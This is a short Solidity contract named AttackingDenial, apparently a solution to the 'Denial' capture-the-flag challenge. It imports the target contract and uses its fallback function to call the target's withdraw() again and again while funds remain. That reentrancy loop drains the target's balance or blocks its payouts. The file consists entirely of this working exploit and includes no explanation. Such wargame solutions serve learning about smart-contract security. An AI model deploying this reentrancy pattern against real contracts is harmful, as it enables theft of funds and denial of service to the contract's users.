// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    fallback() external payable {
        Denial target = Denial(contractAddress);
        if (payable(contractAddress).balance > 0) {
            target.withdraw();
        }
    }
}
